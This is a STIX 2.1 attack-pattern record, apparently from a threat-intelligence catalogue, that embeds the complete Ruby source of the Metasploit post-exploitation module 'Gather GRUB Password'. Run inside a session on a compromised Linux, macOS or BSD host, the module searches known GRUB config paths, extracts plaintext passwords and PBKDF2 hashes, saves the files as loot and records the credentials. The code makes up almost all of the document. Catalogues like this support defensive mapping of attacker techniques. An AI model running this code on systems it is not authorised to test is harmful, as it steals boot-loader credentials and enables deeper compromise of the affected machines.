{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4746ceda-eb32-4a85-88e8-4123f506a505",
    "created": "2024-08-14T16:33:19.170734Z",
    "modified": "2024-08-14T16:33:19.170738Z",
    "name": "Gather GRUB Password",
    "description": " This module gathers GRUB passwords from GRUB bootloader config files.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/multi/gather/grub_creds.rb",
            "external_id": "grub_creds.rb"
        },
        {
            "source_name": "References=>URL",
            "external_id": "https://help.ubuntu.com/community/Grub2/Passwords#Password_Encryption"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Post::Unix\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Gather GRUB Password',\n        'Description' => %q{\n          This module gathers GRUB passwords from GRUB bootloader config files.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Garvit Dewan <d.garvit[at]gmail.com>', # @dgarvit\n          'Taeber Rapczak <taeber[at]rapczak.com>',\n          'Shelby Pace'\n        ],\n        'Platform' => ['linux', 'osx', 'unix', 'solaris', 'bsd'],\n        'SessionTypes' => ['meterpreter', 'shell'],\n        'References' => [ ['URL', 'https://help.ubuntu.com/community/Grub2/Passwords#Password_Encryption'] ]\n      )\n    )\n\n    register_options(\n      [\n        OptString.new(\n          'FILENAME',\n          [false, 'Additional grub configuration filename.', '']\n        ),\n      ]\n    )\n  end\n\n  def parse_passwd_from_file(file)\n    return unless readable?(file)\n\n    print_status(\"Reading #{file}\")\n\n    idx = 0\n    contents = read_file(file)\n    have_pass = false\n    contents.each_line do |line|\n      next unless line.start_with?('password')\n\n      have_pass = true\n      pass_line = line.strip.split(' ')\n      unless pass_line.length == 3\n        print_status('Unknown Grub password convention. Printing line')\n        print_status(line)\n        next\n      end\n\n      convention = pass_line[0]\n      case convention\n      when 'password_pbkdf2'\n        @creds_hash[pass_line[1]] = pass_line[2]\n      when 'password'\n        if pass_line[1].start_with?('--')\n          @pass_hash[idx] = pass_line[2]\n          idx += 1\n        else\n          @creds_hash[pass_line[1]] = pass_line[2]\n        end\n      else\n        print_status('Unknown Grub password convention. Printing line')\n        print_status(line)\n      end\n    end\n\n    if have_pass\n      file_loc = store_loot('grub.config', 'text/plain', session, contents)\n      print_good(\"#{file} saved to #{file_loc}\")\n    end\n  end\n\n  def run\n    @creds_hash = Hash.new\n    @pass_hash = Hash.new\n\n    targets = %w[\n      /boot/grub/grub.conf\n      /boot/grub/grub.cfg\n      /boot/grub/menu.lst\n      /boot/grub2/grub.cfg\n      /boot/grub2/user.cfg\n      /etc/grub.conf\n      /etc/grub/grub.cfg\n      /mnt/sysimage/boot/grub.conf\n      /mnt/boot/grub/grub.conf\n      /rpool/boot/grub/grub.cfg\n    ]\n\n    targets << datastore['FILENAME'] unless datastore['FILENAME'].empty?\n    dir('/etc/grub.d').each do |file|\n      path = '/etc/grub.d/' + file\n      targets << path if file?(path)\n    end\n\n    print_status('Searching for GRUB config files..')\n    targets.each do |target|\n      parse_passwd_from_file(target)\n    end\n\n    if @creds_hash.empty? && @pass_hash.empty?\n      print_bad('No passwords found in GRUB config files')\n    else\n      print_good('Found credentials')\n\n      cred_table = Rex::Text::Table.new(\n        'Header' => 'Grub Credential Table',\n        'Indent' => 1,\n        'Columns' => [ 'Username', 'Password' ]\n      )\n\n      @creds_hash.each do |user, pass|\n        credential_data = {\n          origin_type: :session,\n          post_reference_name: refname,\n          private_type: :nonreplayable_hash,\n          private_data: pass,\n          session_id: session_db_id,\n          username: user,\n          workspace_id: myworkspace_id\n        }\n\n        cred_table << [ user, pass ]\n        create_credential(credential_data)\n      end\n\n      @pass_hash.each do |_index, pass|\n        credential_data = {\n          origin_type: :session,\n          post_reference_name: refname,\n          private_type: :nonreplayable_hash,\n          private_data: pass,\n          session_id: session_db_id,\n          username: '',\n          workspace_id: myworkspace_id\n        }\n\n        cred_table << [ '', pass ]\n        create_credential(credential_data)\n      end\n\n      print_line\n      print_line(cred_table.to_s)\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "['linux', 'osx', 'unix', 'solaris', 'bsd']"
    ]
}